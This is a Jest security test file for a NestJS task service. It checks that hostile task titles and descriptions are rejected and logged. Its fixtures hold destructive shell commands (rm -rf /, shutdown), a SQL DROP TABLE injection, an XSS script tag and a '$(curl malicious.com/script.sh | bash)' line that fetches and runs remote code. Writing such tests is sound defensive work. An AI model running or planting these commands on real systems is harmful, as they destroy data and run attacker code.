import { Test, TestingModule } from '@nestjs/testing';
import { TaskService } from '../../../src/tasks/tasks.service';
import { TasksRepository } from '../../../src/tasks/tasks.repository';
import { ProjectsRepository } from '../../../src/projects/projects.repository';
import { TagsRepository } from '../../../src/tags/tags.repository';
import { getRepositoryToken } from '@nestjs/typeorm';
import { Task } from '../../../src/tasks/tasks.entity';
import { BadRequestException } from '@nestjs/common';
import { CreateTaskDto } from '../../../src/tasks/tasks.dto';
import { SecurityLoggerService } from '../../../src/common/services/security-logger.service';
import { Repository } from 'typeorm';
import { RecurringTaskService } from '../../../src/tasks/recurring-task.service';
import { TaskDomainService } from '../../../src/tasks/tasks.domain.service';

describe('TaskService - Security Tests', () => {
  let service: TaskService;
  let mockTasksRepository: Partial<TasksRepository>;
  let mockProjectsRepository: Partial<ProjectsRepository>;
  let mockTagsRepository: Partial<TagsRepository>;
  let mockTaskRepository: any;
  let mockSecurityLogger: Partial<SecurityLoggerService>;

  beforeEach(async () => {
    mockTasksRepository = {
      createTask: jest.fn(),
      getTasks: jest.fn(),
      getTaskById: jest.fn(),
    };

    mockProjectsRepository = {
      findOne: jest.fn(),
    };

    mockTagsRepository = {
      findByIds: jest.fn(),
    };

    mockTaskRepository = {
      create: jest.fn(),
      save: jest.fn(),
    };

    mockSecurityLogger = {
      logSecurityEvent: jest.fn(),
      logValidationFailure: jest.fn(),
      logSuspiciousActivity: jest.fn(),
    };

    // Mock for RecurringTaskService
    const mockRecurringTaskService = {
      processCompletedTask: jest.fn(),
      scheduleNextRecurrence: jest.fn(),
      calculateNextOccurrence: jest.fn(),
    };

    // Mock for TaskDomainService
    const mockTaskDomainService = {
      calculateNextOccurrence: jest.fn(),
      isTaskDue: jest.fn(),
      getTasksNeedingReminders: jest.fn(),
      completeTask: jest.fn(),
      determineNotificationType: jest.fn(),
      canCompleteTask: jest.fn(),
    };

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        TaskService,
        {
          provide: TasksRepository,
          useValue: mockTasksRepository,
        },
        {
          provide: ProjectsRepository,
          useValue: mockProjectsRepository,
        },
        {
          provide: TagsRepository,
          useValue: mockTagsRepository,
        },
        {
          provide: getRepositoryToken(Task),
          useValue: mockTaskRepository,
        },
        {
          provide: SecurityLoggerService,
          useValue: mockSecurityLogger,
        },
        {
          provide: RecurringTaskService,
          useValue: mockRecurringTaskService,
        },
        {
          provide: TaskDomainService,
          useValue: mockTaskDomainService,
        },
      ],
    }).compile();

    service = module.get<TaskService>(TaskService);
  });

  describe('Command Injection Prevention', () => {
    const testCases = [
      {
        scenario: 'Shell command in title',
        input: {
          title: 'rm -rf / ; Drop database;',
          description: 'Normal description',
        },
      },
      {
        scenario: 'System command in description',
        input: {
          title: 'Normal Title',
          description: 'shutdown -h now; Format C:',
        },
      },
      {
        scenario: 'SQL injection attempt',
        input: {
          title: "'; DROP TABLE tasks; --",
          description: 'Normal description',
        },
      },
      {
        scenario: 'Command with special characters',
        input: {
          title: '$(curl malicious.com/script.sh | bash)',
          description: 'Normal description',
        },
      },
      {
        scenario: 'JavaScript injection',
        input: {
          title: '<script>alert("xss")</script>',
          description: 'Normal description',
        },
      },
    ];

    testCases.forEach(({ scenario, input }) => {
      it(`should sanitize ${scenario}`, async () => {
        const createTaskDto: CreateTaskDto = {
          title: input.title,
          description: input.description,
        };

        mockTaskRepository.create.mockReturnValue({
          ...createTaskDto,
          id: 'test-id',
        });

        mockTaskRepository.save.mockResolvedValue({
          id: 'test-id',
          ...createTaskDto,
        });

        // The service should either sanitize the input or reject it
        await expect(service.createTask(createTaskDto)).rejects.toThrow(
          BadRequestException,
        );

        // Verify that the security logger was called
        expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
      });
    });

    it('should validate and sanitize task title length', async () => {
      const createTaskDto: CreateTaskDto = {
        title: 'a'.repeat(1000), // Exceeds max length
        description: 'Normal description',
      };

      await expect(service.createTask(createTaskDto)).rejects.toThrow(
        BadRequestException,
      );
      expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
    });

    it('should validate and sanitize task description length', async () => {
      const createTaskDto: CreateTaskDto = {
        title: 'Normal Title',
        description: 'a'.repeat(5000), // Exceeds max length
      };

      await expect(service.createTask(createTaskDto)).rejects.toThrow(
        BadRequestException,
      );
      expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
    });

    it('should handle null byte injection attempts', async () => {
      const createTaskDto: CreateTaskDto = {
        title: 'Malicious\0Title',
        description: 'Normal description',
      };

      await expect(service.createTask(createTaskDto)).rejects.toThrow(
        BadRequestException,
      );
      expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
    });
  });

  describe('Date Validation', () => {
    it('should reject invalid date formats', async () => {
      const createTaskDto: CreateTaskDto = {
        title: 'Task with invalid date',
        description: 'Test description',
        dueDate: 'not-a-date',
      };

      await expect(service.createTask(createTaskDto)).rejects.toThrow(
        BadRequestException,
      );
      expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
    });

    it('should validate past dates', async () => {
      const pastDate = new Date();
      pastDate.setFullYear(pastDate.getFullYear() - 1); // One year ago

      const createTaskDto: CreateTaskDto = {
        title: 'Task with past date',
        description: 'Test description',
        dueDate: pastDate.toISOString(),
      };

      await expect(service.createTask(createTaskDto)).rejects.toThrow(
        BadRequestException,
      );
      expect(mockSecurityLogger.logValidationFailure).toHaveBeenCalled();
    });
  });
});
